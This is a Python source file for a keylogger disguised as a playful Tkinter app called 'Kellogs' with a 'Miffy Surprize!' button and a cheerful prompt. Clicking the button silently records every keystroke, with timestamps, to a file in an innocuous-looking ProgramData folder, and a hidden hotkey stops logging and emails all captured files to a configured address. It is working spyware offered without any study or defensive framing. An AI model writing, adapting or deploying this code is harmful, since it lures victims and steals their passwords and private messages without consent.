import tkinter as tk
from pynput import keyboard
import threading
import datetime
import os
import keyboard as kb
import yagmail
import glob


stop_flag = False
listener = None


save_path = "C:/ProgramData/SystemCache/"
if not os.path.exists(save_path):
    os.makedirs(save_path)


sender_email = "mail address"
app_password = "app password" 
receiver_email = "mail address"


def send_logs_via_email():
    yag = yagmail.SMTP(sender_email, app_password)
    files_to_send = glob.glob(os.path.join(save_path, "*"))
    
    if files_to_send:
        yag.send(
            to=receiver_email,
            subject="Keylogger Logs",
            contents="Attached is the final keylog report.",
            attachments=files_to_send
        )


def on_press(key):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        key_str = key.char
    except AttributeError:
        key_map = {
            keyboard.Key.space: ' ',
            keyboard.Key.enter: '[Enter]',
            keyboard.Key.tab: '[Tab]',
            keyboard.Key.shift: '[Shift]',
            keyboard.Key.shift_r: '[Shift]',
            keyboard.Key.ctrl_l: '[Ctrl]',
            keyboard.Key.ctrl_r: '[Ctrl]',
            keyboard.Key.alt_l: '[Alt]',
            keyboard.Key.alt_r: '[Alt]',
            keyboard.Key.esc: '[Esc]',
            keyboard.Key.backspace: '[Backspace]',
            keyboard.Key.caps_lock: '[CapsLock]',
            keyboard.Key.delete: '[Delete]',
            keyboard.Key.left: '[Left]',
            keyboard.Key.right: '[Right]',
            keyboard.Key.up: '[Up]',
            keyboard.Key.down: '[Down]',
        }
        key_str = key_map.get(key, f'[{str(key).replace("Key.", "").capitalize()}]')

    with open(os.path.join(save_path, "systemklogfiles.txt"), "a", encoding="utf-8") as f:
        f.write(f"{timestamp} - {key_str}\n")


def start_keylogger():
    global listener
    status_label.config(text=".....")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    start_button.config(state="disabled")


def stop_keylogger():
    global stop_flag
    stop_flag = True
    if listener:
        listener.stop()
    status_label.config(text="#####")
    send_logs_via_email()


kb.add_hotkey('ctrl+shift+q', stop_keylogger)


root = tk.Tk()
root.title("Kellogs")
root.geometry("700x550")

text_label = tk.Label(root, text="Kellogs", font=("Arial", 25), fg="#DE6FA1")
text_label.pack(pady=30)


try:
    photo = tk.PhotoImage(file="mif2.png")
    image_label = tk.Label(root, image=photo)
    image_label.image = photo  
    image_label.pack()
except Exception as e:
    print("Image load error:", e)

start_button = tk.Button(root, text="Miffy Surprize!", font=("Arial", 20), fg="#DE6FA1", command=start_keylogger)
start_button.pack(pady=30)

status_label = tk.Label(root, text="Click to let me know more about you  ^_^  !", font=("Arial", 15), fg="#DE6FA1")
status_label.pack()

root.mainloop()